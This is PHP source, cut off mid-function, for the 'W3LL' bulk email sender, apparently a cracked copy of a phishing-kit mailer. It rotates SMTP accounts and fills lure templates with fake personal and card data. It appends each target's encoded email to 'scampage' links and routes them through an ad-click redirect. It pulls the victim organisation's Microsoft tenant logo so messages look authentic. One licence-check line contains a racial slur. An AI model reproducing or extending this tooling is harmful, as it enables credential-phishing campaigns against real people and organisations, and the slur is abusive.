<?php

#!/usr/bin/php
error_reporting(0);
//ini_set('memory_limit','-1');

require_once 'setting/faker/src/autoload.php';
$w3ll_fake = Faker\Factory::create(en_US);

include 'config.php';
include 'setting/view/view.php';

require 'setting/php/PHPMailerAutoload.php';
require 'setting/php/class.phpmailer.php';
require 'setting/php/class.smtp.php';
require 'setting/faker/src/autoload.php';

//Variables
$microsoft = '';
$faker = '';

//Getting template class
$warna = new W3ll_color();
$banner = new Banner();
echo chr(27).chr(91).'H'.chr(27).chr(91).'J'; // ^[H^[J

//Updates Check
$banner->update();

/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://w3ll.store/api/sender-update?version=' . $banner->version);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$result = curl_exec($ch);

if (curl_errno($ch))
{
    echo 'Error:' . curl_error($ch);
}

curl_close($ch);
*/
$result = '';
if ($result == 'Update')
{
    echo chr(27).chr(91).'H'.chr(27).chr(91).'J'; // ^[H^[J
    echo $warna->lightgreen("Update Available!");
    file_put_contents("w3ll.zip", fopen("https://w3ll.store/operators/w3ll-a3.zip", 'r'));
    exec("unzip -o w3ll.zip && rm -rf w3ll.zip");
    $version = $version + 1;
    echo PHP_EOL.$warna->green("Success updating to new version , please run php W3LL again.");
    sleep(5);
    echo chr(27).chr(91).'H'.chr(27).chr(91).'J'; // ^[H^[J
	system('clear');
	echo $warna->white("PLEASE MAKE").$warna->Yellow(" PUTTY").$warna->white(" /").$warna->Yellow(" TERMINAL").$warna->white(" FULL SCREEN !");
	sleep(10);
    exit();
} else {
    echo $warna->lightgreen("No update available!");
    sleep(2);
	system('clear');
}

echo chr(27).chr(91).'H'.chr(27).chr(91).'J'; // ^[H^[J

function deleteSMTP($smtpuser)
{
    /* DELETE SMTP */
    $file='settings.php';   
    $line = getLineWithString($file, $smtpuser);

    $contents = file_get_contents("settings.php");
    $contents = str_replace($line, '', $contents);
    file_put_contents("settings.php", $contents);

    $file = fopen("BAD_SMTP.txt", "a");
    fwrite($file, "" . $line);
    fclose($file);
    /* END */
}

function getLineWithString($fileName, $str) {
    $lines = file($fileName);
    foreach ($lines as $lineNumber => $line) {
        if (strpos($line, $str) !== false) {
            return $line;
        }
    }
    return -1;
}

function encode($text)
{
   $list = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","[","]","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","1","2","3","4","5","6","7","8","9","0",":",",",".","#") ;
   $replace = array("ａ", "ᖯ", "ｃ","ｄ","ｅ","ｆ","ｇ","ｈ","ｉ","ｊ","ｋ","ｌ","ｍ","ｎ","ｏ","ｐ","ｑ","ｒ","ｓ","ｔ","ｕ","ｖ","ｗ","ｘ","ｙ","ｚ","［","］","Ａ", "Ｂ", "Ｃ","Ｄ","Ｅ","Ｆ","Ｇ","Ｈ","Ｉ","Ｊ","Ｋ","Ｌ","Ｍ","Ｎ","Ｏ","Ｐ","Ｑ","Ｒ","Ｓ","Ｔ","Ｕ","Ｖ","Ｗ","Ｘ","Ｙ","Ｚ","１","２","３","４","５","６","７","８","９","０","：","，","．","＃");

   $walah = str_replace($list, $replace, $text);
   return $walah;
}

/* This Validation Token Function */
function checkValid($token)
{
    $ch = curl_init();
    $token = urlencode($token);
	$time = time();
    curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/sender?token=$token&time=$time");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $result = curl_exec($ch);
    if (curl_errno($ch))
    {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);

    return $result;
}
$myfile = fopen("token.txt", "r") or die("Unable to open file!");
$uToken = fread($myfile,filesize("token.txt"));
fclose($myfile);
if(!$uToken === 'cracked_by_@f4c3r100'){ die('Leave Credits nigger'); }

function privateLHZ($replacement, $data, $opt = null)
{
    $domains = explode('@', $replacement);
    $domain = ucfirst("$domains[1]");
    $domain2 = $domains[1];
    $pattern = array(
        '/\+\+w3ll_email\+\+/',
        '/\+\+w3ll_domain\+\+/',
        '/\+\+w3ll_domain1\+\+/',
        '/\+\+w3ll_user\+\+/',
        '/\+\+w3ll_number3\+\+/',
        '/\+\+w3ll_number4\+\+/',
        '/\+\+w3ll_number5\+\+/',
        '/\+\+w3ll_secret_email\+\+/',
        '/\+\+w3ll_smtp_user\+\+/'
    );
    $replace = array(
        $replacement,
        explode('@', $replacement) [1],
        explode('.', $domain) [0],
        explode('@', $replacement) [0],
        str_shuffle(implode("", range(000, 999))) ,
        str_shuffle(implode("", range(0000, 9999))) ,
        str_shuffle(implode("", range(00000, 99999))) ,
        str_replace(substr(explode('@', $replacement) [0], 2, (strlen(explode('@', $replacement) [0]) / 2) + 2) , '********', $replacement) ,
        explode("@", $opt) [0]
    );
    return preg_replace($pattern, $replace, $data);
}

function privateLHZ1($replacement, $data, $opt = null)
{
    $domains = explode('@', $replacement);
    $domain = ucfirst("$domains[1]");
    $domain2 = $domains[1];
    $pattern = array(
        '/\+\+w3ll_email\+\+/',
        '/\+\+w3ll_domain\+\+/',
        '/\+\+w3ll_domain1\+\+/',
        '/\+\+w3ll_user\+\+/',
        '/\+\+w3ll_number3\+\+/',
        '/\+\+w3ll_number4\+\+/',
        '/\+\+w3ll_number5\+\+/',
        '/\+\+w3ll_secret_email\+\+/',
        '/\+\+w3ll_smtp_user\+\+/'
    );
    $replace = array(
        $replacement,
        explode('@', $replacement) [1],
        explode('.', $domain) [0],
        explode('@', $replacement) [0],
        str_shuffle(implode("", range(000, 999))) ,
        str_shuffle(implode("", range(0000, 9999))) ,
        str_shuffle(implode("", range(00000, 99999))) ,
        str_replace(substr(explode('@', $replacement) [0], 2, (strlen(explode('@', $replacement) [0]) / 2) + 2) , '********', $replacement) ,
        explode("@", $opt) [0]
    );
    return preg_replace($pattern, $replace, $data);
}

function RandString($randstr)
{
    $char = 'QWERTYUIOPASDFGHJKLZXCVBNM123456789';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
$uname = php_uname("n");
function RandString1($randstr)
{
    $char = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};

function RandNumber($randstr)
{
    $char = '123456789';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
function Randchar($randstr)
{
    $char = '!@#$%^&*()_+{}[]|\;:,.<>/?`~';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
	$w3ll_fake = Faker\Factory::create();
    //JSON OBJ
    $w3ll_obj->phone =  $w3ll_fake->e164PhoneNumber;
    $w3ll_obj->uname = $w3ll_fake->userName;
	
    $w3ll_data_phone = $w3ll_obj->phone;
    $w3ll_data_uname = $w3ll_obj->uname;


function secret_mail($email)
{
    $em = explode("@", $email);
    $name = implode(array_slice($em, 0, count($em) - 1) , '@');
    $len = floor(strlen($name) / 2);

    return substr($name, 0, $len) . str_repeat('*', $len) . "@" . end($em);
}

function secret_uname($w3ll_data_uname)
{
    $user_data = strlen($w3ll_data_uname);
    $number = ($user_data / 2);

    if (strpos($number, '.') !== false) {
    	$user2 = explode('.', $number);
	    $number = $user2[0];
	}

	$user_data = $w3ll_data_uname[$number];
    $ph = explode($user_data, $w3ll_data_uname);
    $name = implode(array_slice($ph, 0, count($ph) - 1) , $user_data);
    $len = floor(strlen($name) / 2);

    return substr($name, 0, $len) . str_repeat('*', $len) . $user_data . end($ph);
}

function lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject, $smtp_user, $redirect, $microsoft_val = 0, $letter = 1, $fname = '', $lname = '')
{
    global $username, $password, $ids, $microsoft, $faker;
    //random user
    $w3ll_fake = Faker\Factory::create();
    //JSON OBJ
    $w3ll_obj->company =  $w3ll_fake->company;
    $w3ll_obj->name = $w3ll_fake->firstName." ".$w3ll_fake->lastName;
    $w3ll_obj->phone =  $w3ll_fake->e164PhoneNumber;
	$w3ll_obj->companyphone =  $w3ll_fake->tollFreePhoneNumber;
    $w3ll_obj->email =  $w3ll_fake->companyEmail;
    $w3ll_obj->uuid = $w3ll_fake->uuid;
    $w3ll_obj->site = $w3ll_fake->domainName;
    $w3ll_obj->fname = $w3ll_fake->firstName;
    $w3ll_obj->lname = $w3ll_fake->lastName;
    $w3ll_obj->postcode = $w3ll_fake->postcode;
    $w3ll_obj->country = $w3ll_fake->country;
    $w3ll_obj->state = $w3ll_fake->state;
    $w3ll_obj->city = $w3ll_fake->city;
    $w3ll_obj->addrs = $w3ll_fake->address;
    $w3ll_obj->street = $w3ll_fake->streetName;
    $w3ll_obj->cc = $w3ll_fake->creditCardNumber;
    $w3ll_obj->expr = $w3ll_fake->creditCardExpirationDateString;
    $w3ll_obj->ctype = $w3ll_fake->creditCardType;
    $w3ll_obj->uname = $w3ll_fake->userName;
    $w3ll_obj->staddrs = $w3ll_fake->streetAddress;
    $w3ll_obj->iban = $w3ll_fake->iban;
	$w3ll_obj->domain = $w3ll_fake->domainName;
    $w3ll_obj->freedomain = $w3ll_fake->freeEmailDomain;
    $w3ll_obj->isbn10 = $w3ll_fake->isbn10;
    $w3ll_obj->sha1 = $w3ll_fake->sha1;
    $w3ll_obj->md5 = $w3ll_fake->md5;
    $w3ll_obj->sha256 = $w3ll_fake->sha256;
    $w3ll_obj->ipv4 = $w3ll_fake->ipv4;
    $w3ll_obj->ua = $w3ll_fake->userAgent;
    $w3ll_obj->url = $w3ll_fake->url;

    $w3ll_data_company = $w3ll_obj->company;
    $w3ll_data_name = $w3ll_obj->name;
    $w3ll_data_phone = $w3ll_obj->phone;
	$w3ll_data_companyphone = $w3ll_obj->companyphone;
	$w3ll_data_phone1 = $w3ll_obj->phone;
    $w3ll_data_email = $w3ll_obj->email;
    $w3ll_data_uuid = $w3ll_obj->uuid;
    $w3ll_data_site = $w3ll_obj->site;
    $w3ll_data_fname = $w3ll_obj->fname;
    $w3ll_data_lname = $w3ll_obj->lname;
    $w3ll_data_postcode = $w3ll_obj->postcode;
    $w3ll_data_country = $w3ll_obj->country;
    $w3ll_data_state = $w3ll_obj->state;
    $w3ll_data_city = $w3ll_obj->city;
    $w3ll_data_addrs = $w3ll_obj->addrs;
    $w3ll_data_street = $w3ll_obj->street;
    $w3ll_data_cc = $w3ll_obj->cc;
    $w3ll_data_expr= $w3ll_obj->expr;
	$w3ll_data_ctype= $w3ll_obj->ctype;
    $w3ll_data_uname = $w3ll_obj->uname;
    $w3ll_data_staddrs = $w3ll_obj->staddrs;
	$w3ll_data_iban = $w3ll_obj->iban;
	$w3ll_data_domain = $w3ll_obj->domain;
	$w3ll_data_freedomain = $w3ll_obj->freedomain;
	$w3ll_data_isbn10 = $w3ll_obj->isbn10;
	$w3ll_data_sha1 = $w3ll_obj->sha1;
	$w3ll_data_md5 = $w3ll_obj->md5;
	$w3ll_data_sha256 = $w3ll_obj->sha256;
	$w3ll_data_ua = $w3ll_obj->ua;
    
	$num_sec = substr($w3ll_data_phone1, 0, 11);
	$num_ex  = explode("+",$num_sec);
	$w3ll_data_phone_sec = implode("+1",$num_ex);
	

    $user2[0] = '';
    $user2[1] = '';

    $users = explode('@', $email);
    $user = $users[0];
    $user1 = ucwords($users[0]);

    if (strpos($users[0], '.') !== false) {
    	$user2 = explode('.', $users[0]);
	    $user3 = ucwords($user2[0]);
	    $user4 = ucwords($user2[1]);
	    $user5 = $user3." ".$user4;
	}
	else{
		$user5 = $users[0];
	}

    $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
    $domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domainn = ucwords("$domains1[0]");
	$domain1 = str_replace('-', ' ', $domainn);
	$domain1 = ucwords($domain1);
    $secret_mail = secret_mail($email);
    $randip = "" . rand(1, 100) . "." . rand(1, 100) . "." . rand(1, 100) . "." . rand(1, 100) . "";
    $randstr1 = RandString(10);
    $randstr1 = RandString(6);
    $randnumber1 = RandNumber(1);
    $randnumber2 = RandNumber(2);
    $randnumber3 = RandNumber(3);
    $randnumber4 = RandNumber(4);
    $randnumber5 = RandNumber(5);
    $randnumber6 = RandNumber(6);
    $randnumber7 = RandNumber(7);
    $randnumber8 = RandNumber(8);
    $randnumber9 = RandNumber(9);
    $randnumber10 = RandNumber(10);
	$Randchar1 = Randchar(1);
    $Randchar2 = Randchar(2);
    $Randchar3 = Randchar(3);
    $Randchar4 = Randchar(4);
    $Randchar5 = Randchar(5);
    $Randchar6 = Randchar(6);
    $Randchar7 = Randchar(7);
    $Randchar8 = Randchar(8);
    $Randchar9 = Randchar(9);
    $Randchar10 = Randchar(10);
    $secret_phone = substr_replace($w3ll_data_phone_sec,"***",3,4);
	$secret_user = secret_uname($w3ll_data_uname);

    $result = '';
    $img_src = '';
    $img_src1 = '';
    if($microsoft_val == 1){
        $microsoft = curl_init();

        curl_setopt($microsoft, CURLOPT_URL, 'https://login.microsoftonline.com/common/GetCredentialType');
        curl_setopt($microsoft, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($microsoft, CURLOPT_POST, 1);
        curl_setopt($microsoft, CURLOPT_POSTFIELDS, "{\"Username\":\"".$email."\"}");
        curl_setopt($microsoft, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );

        $headers = array();
        $headers[] = 'Content-Type: application/json';
        curl_setopt($microsoft, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($microsoft);
        if (curl_errno($microsoft)) {
            echo 'Error:' . curl_error($microsoft);
        }
        curl_close($microsoft);

        $found = $result;

	    $result = json_decode($result, true);
	    
	    $img_src = '';

	    if (strpos($found, 'BannerLogo') !== false) {
	        $logo = $result["EstsProperties"]["UserTenantBranding"][0]["BannerLogo"];
	        $imgData = base64_encode(file_get_contents($logo));

	        $img_src = 'data:image/jpeg;base64,' . $imgData;
	        
	        $img_src = '<img src="' . $img_src . '"><br>';
	    } 
	    else 
	    {
	        $imgData = base64_encode(file_get_contents("file/image/microsoft_PNG10.jpg"));

	        $img_src = 'data:image/jpeg;base64,' . $imgData;

	        $img_src = '<img src="' . $img_src . '" width="220" height="50"><br>';
	    }
	    
	    $imgData1 = base64_encode(file_get_contents("file/image/image.png"));

	    $img_src1 = 'data:image/jpeg;base64,' . $imgData1;
    }

    shuffle($randurl);
    $smtp_email = $smtp_user;
    $smtp_user = explode("@", $smtp_user) [0];

    $randurls = array_shift($randurl);

    preg_match('@^(?:https://)?([^/]+)@i', $randurls, $matches);
    $host = $matches[1];

    $host = explode('.', $host);
    $host = $host[0];

    $email64 = base64_encode($email);
    $base64url = base64_decode($randurls);

    if ($redirect == 1)
    {
        $randurls = "$randurls?email=" . urlencode($email64) . "";
    }
    else if ($redirect == 2)
    {
        $randurls = "$randurls?a=" . urlencode($email64) . "";
    }
    else if ($redirect == 3)
    {
        $randurls = "$randurls?email=" . urlencode($email) . "";
    }
    else if ($redirect == 4)
    {
        $randurls = "$randurls?++w3ll_randstring++-++w3ll_number4++#" . urlencode($email64) . "";
    }
    else if ($redirect == 5)
    {
        $randurls = "$randurls#" . urlencode($email64) . "";
    }
    else if ($redirect == 6)
    {
        $randurls = "$randurls" . urlencode($email64) . "";
    }
    else if ($redirect == 7)
    {
        $randurls = "$randurls#" . urldecode($email) . "";
    }
    else if ($redirect == 8)
    {
        $randurls = "https://googleads.g.doubleclick.net/pcs/click?xai=AKAOjssIdZGtK2LGw4coQMwtQcONuf8cVZUVHUrlFgT33_wiLCuxpoweUvHdBH9neY4iW-CZh2SzgITptx6j64F0B2pEU0uoeRfmKTeyn7LSG5Irubqjv6IFl9MeqTp84ZT99WRJlZDMgrwUaUI7QjgNwL22AVveJm980wuVNryiILT2WhxCPmcY8M7PVIOygAXT_382p7PUn7bIByn2OjlTfCiaqta3tAhZWCuROeXZPznm5cGhgUYspVywPb8Y8GbuT5pyEUyF89icmqe5zg&sig=Cg0ArKJSzFtr0kI2Y6Ll&adurl=".urlencode("$randurls").urlencode($email64)."&nx=CLICK_X&ny=CLICK_Y";
    }
    else if($redirect == 9)
    {
        $randurls = "$randurls" . urlencode($email64) . "";
    }
    $countries = array("Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe");
    shuffle($countries);
    $country = array_shift($countries);

    $OSystems = array('Windows 10', 'Windows 8.1', 'Windows 8', 'Windows 7', 'Mac OS X', 'Mac OS 9', 'Linux', 'Ubuntu', 'iPhone', 'iPod', 'iPad', 'Android', 'Windows 10 Home Edition');
    shuffle($OSystems);
    $OS = array_shift($OSystems);

    $ListBrowser = array('Internet Explorer', 'Firefox', 'Safari', 'Chrome', 'Edge', 'Opera');
    shuffle($ListBrowser);
    $browser = array_shift($ListBrowser);
    
    $date = date('d F, Y');
    $time = date('g:i A (T)');


    if($letter == 1) { $file = file_get_contents($msgfile); }
    else { $file = $msgfile; }
    $arr = array(
        '++w3ll_logo++',
        '++w3ll_logo1++',
        '++w3ll_data_company++',
        '++w3ll_data_name++',
        '++w3ll_data_phone++',
		'++w3ll_data_companyphone++',
        '++w3ll_data_secret_phone++',
        '++w3ll_data_email++',
        '++w3ll_data_uuid++',
        '++w3ll_data_site++',
        '++w3ll_data_fname++',
        '++w3ll_data_lname++',
        '++w3ll_data_postcode++',
        '++w3ll_data_country++',
        '++w3ll_data_state++',
        '++w3ll_data_city++',
        '++w3ll_data_addrs++',
        '++w3ll_data_street++',
        '++w3ll_data_cc++',
        '++w3ll_data_expr++',
        '++w3ll_data_ctype++',
		'++w3ll_data_uname++',
		'++w3ll_data_secret_uname++',
        '++w3ll_data_staddrs++',
		'++w3ll_data_iban++',
		'++w3ll_data_domain++',
		'++w3ll_data_freedomain++',
		'++w3ll_data_isbn10++',
		'++w3ll_data_sha1++',
		'++w3ll_data_md5++',
		'++w3ll_data_sha256++',
		'++w3ll_data_ua++',
        '++w3ll_domain_url++',
        '++w3ll_smtp++',
        '++w3ll_short64++',
        '++w3ll_email64++',
        '++w3ll_email++',
        '++w3ll_subject++',
        '++w3ll_randomip++',
        '++w3ll_frommail++',
        '++w3ll_fromname++',
        '++w3ll_short++',
        '++w3ll_randstring++',
        '++w3ll_country++',
        '++w3ll_date++',
        '++w3ll_number1++',
        '++w3ll_number2++',
        '++w3ll_number3++',
        '++w3ll_number4++',
        '++w3ll_number5++',
        '++w3ll_number6++',
        '++w3ll_number7++',
        '++w3ll_number8++',
        '++w3ll_number9++',
        '++w3ll_number10++',
		'++w3ll_char1++',
        '++w3ll_char2++',
        '++w3ll_char3++',
        '++w3ll_char4++',
        '++w3ll_char5++',
        '++w3ll_char6++',
        '++w3ll_char7++',
        '++w3ll_char8++',
        '++w3ll_char9++',
        '++w3ll_char10++',
        '++w3ll_os++',
        '++w3ll_browser++',
        '++w3ll_time++',
        '++w3ll_user++',
        '++w3ll_domain++',
        '++w3ll_domain1++',
        '++w3ll_secret_email++',
        '++w3ll_smtp_user++',
        '++w3ll_domain2++',
		'++w3ll_fname++',
		'++w3ll_lname++'
    );

$new  = array('' . $img_src . '','' . $img_src1 . '','' . $w3ll_data_company . '','' . $w3ll_data_name . '','' . $w3ll_data_phone . '','' . $w3ll_data_companyphone . '','' . $secret_phone . '','' . $w3ll_data_email . '','' . $w3ll_data_uuid . '','' . $w3ll_data_site . '','' . $w3ll_data_fname . '','' . $w3ll_data_lname . '','' . $w3ll_data_postcode . '','' . $w3ll_data_country . '','' . $w3ll_data_state . '','' . $w3ll_data_city . '','' . $w3ll_data_addrs . '','' . $w3ll_data_street . '','' . $w3ll_data_cc . '','' . $w3ll_data_expr . '','' . $w3ll_data_ctype . '','' . $w3ll_data_uname . '','' . $secret_user . '','' . $w3ll_data_staddrs . '','' . $w3ll_data_iban . '','' . $w3ll_data_domain . '','' . $w3ll_data_freedomain . '','' . $w3ll_data_isbn10 . '','' . $w3ll_data_sha1 . '','' . $w3ll_data_md5 . '','' . $w3ll_data_sha256 . '','' . $w3ll_data_ua . '','' . $host . '','' . $smtp_email . '','' . $base64url . '','' . $email64 . '','' . $email . '', '' . $subject . '', '' . $randip . '', '' . $frommail . '', '' . $fromname . '', '' . $randurls . '', '' . $randstr1 . '', '' . $country . '', '' . $date . '', '' . $randnumber1 . '', '' . $randnumber2 . '', '' . $randnumber3 . '', '' . $randnumber4 . '', '' . $randnumber5 . '', '' . $randnumber6 . '', '' . $randnumber7 . '', '' . $randnumber8 . '', '' . $randnumber9 . '', '' . $randnumber10 . '', '' . $Randchar1 . '', '' . $Randchar2 . '', '' . $Randchar3 . '', '' . $Randchar4 . '', '' . $Randchar5 . '', '' . $Randchar6 . '', '' . $Randchar7 . '', '' . $Randchar8 . '', '' . $Randchar9 . '', '' . $Randchar10 . '', '' . $OS . '', '' . $browser . '','' . $time . '','' . $user5 . '','' . $domain . '','' . $domain1 . '','' . $secret_mail . '', ''.$smtp_user.'', ''.$domain2.'', ''.$fname.'', ''.$lname.'');
    $repl = str_replace($arr, $new, $file);
    return $repl;
};
function Savedata($file, $data)
{
    $file = fopen($file, "w");
    fputs($file, PHP_EOL . $data);
    return fclose($file);
};

function Kirim($email, $smtp_acc, $W3LL_setup, $num, $banner, $redirect_count, $code, $def = 0, $fname = '', $lname = '')
{
    global $ahh, $mail;
    $debugsmtp = $W3LL_setup['smtp_debug'];
    $smtp = new SMTP;
    $smtp->do_debug = $debugsmtp;

    //Variables
    $smtpserver = $smtp_acc['host'];
    $smtpport = $smtp_acc['port'];
    $smtpuser = $smtp_acc['username'];
    $smtppass = $smtp_acc['password'];
    $priority = $W3LL_setup['priority'];
    $sleeptime = $W3LL_setup['sleeptime'];
    $replacement = $W3LL_setup['replacement'];
    $userremoveline = $W3LL_setup['userremoveline'];
    $fromname = $W3LL_setup['fromname'];
    $frommail = $W3LL_setup['frommail'];
    $type_filesend = $W3LL_setup['type_filesend'];
    $subject = $W3LL_setup['subject'];
    $msgfile = $W3LL_setup['msgfile'];
    $filepdf = $W3LL_setup['filesend'];
    $randurl = $W3LL_setup['scampage'];
    $redirect = $W3LL_setup['redirect'];
    $replyto = $W3LL_setup['replyto'];
    $header = $W3LL_setup['header'];
    $header1 = $W3LL_setup['custom_header'];
    $subject_encrypt = $W3LL_setup['subject_encrypt'];
    $fromname_encrypt = $W3LL_setup['fromname_encrypt'];
    $emailtest = $W3LL_setup['email_test'];
    $everyemail = $W3LL_setup['test_every'];
    $emaildestination = $W3LL_setup['email_destination'];
	$typeattach =$W3LL_setup['attachment_type'];
	$subject_encode = $W3LL_setup['subject_encode_type'];
	$fromname_encode = $W3LL_setup['fromname_encode_type'];
	$encoding = $W3LL_setup['encoding'];
	$send_type = $W3LL_setup['send_type'];
	$listnih = $W3LL_setup['mail_list'];
	$smtp_server404 = $W3LL_setup['smtp_server404'];
	
    $date = date('d F, Y');
    $time = date('g:i A (T)');

    //Add ...
    $smtpcut = $smtpuser;
    if (strlen($smtpcut) >= 5) $smtpcut = substr($smtpcut, 0, 5) . '...';
    $emailcut = $email;
    if (strlen($emailcut) >= 6) $emailcut = substr($emailcut, 0, 6) . '...';
	foreach($subject as $subjectss){
	$subjectcut = $subjectss;
    if (strlen($subjectcut) >= 10) $subjectcut = substr($subjectcut, 0, 10) . '...';
	}
	foreach($fromname as $fromnameee){
	$fromnamecut = $fromnameee;
    if (strlen($fromnamecut) >= 10) $fromnamecut = substr($fromnamecut, 0, 10) . '...';
	}
    //Port 465 Bypass
    if ($smtpport == 465)
    {
        $smtpserver = "ssl://" . $smtpserver;
    }

    //Checking
    if (!$smtp->connect($smtpserver, $smtpport))
    {
        //throw new Exception('Connect failed');
        $banner->errorcase1();
        /* DELETE SMTP */
        $file='settings.php';   
        $line = getLineWithString($file, $smtpuser);

        $contents = file_get_contents("settings.php");
        $contents = str_replace($line, '', $contents);
        file_put_contents("settings.php", $contents);

        /* END */
		die();
    }
    if (!$smtp->hello(gethostname()))
    {
        //throw new Exception('EHLO failed: ' . $smtp->getError()['error']);
        $banner->errorcase2();
		/* DELETE SMTP */
        $file='settings.php';   
        $line = getLineWithString($file, $smtpuser);

        $contents = file_get_contents("settings.php");
        $contents = str_replace($line, '', $contents);
        file_put_contents("settings.php", $contents);

        /* END */
        die();
    }
    if(strpos($smtpserver, "amazon") !== false){
        $e = $smtp->getServerExtList();
        if (array_key_exists('STARTTLS', $e)) {
                $tlsok = $smtp->startTLS();
        }
    }
            if ($smtp->authenticate($smtpuser, $smtppass) || $smtpserver == 'smtp.office365.com' || $smtpserver == 'smtp.gmail.com' || $smtpserver == 'smtp.strato.com' || $smtpserver == 'smtp.ionos.com' || $smtpserver == 'smtp.1and1.com' || $smtpserver == $smtp_server404)
    {
        $mail = new PHPMailer();
        $mail->SMTPDebug = $debugsmtp; 
        /*  Smtp connect */
        $mail->Encoding = $W3LL_setup['encoding'];
        $mail->CharSet = 'UTF-8';
        $mail->headerLine("format", "flowed");
		$mail->SMTPSecure = 'tls';
        $domains = explode('@', $smtpuser);
        $domain = ucfirst("$domains[1]");
        $randnumhead = RandString1(50);
        $randnumhead1 = RandString(35);
        $randnumhead2 = RandString(12);
		$randnumhead3 = RandString(12);
		$randnumhead4 = RandNumber(2);
        $usu2 = RandString(11);
        $domainhead = explode('@', $email);


        //Amazon SMTP BUG
        if(strpos($smtpserver, "amazon") !== false){}
        //elseif(strpos($smtpserver, "smtp.gmail.com") !== false){}
        elseif($W3LL_setup['custom_header'] == 0){
            //Mail header used 
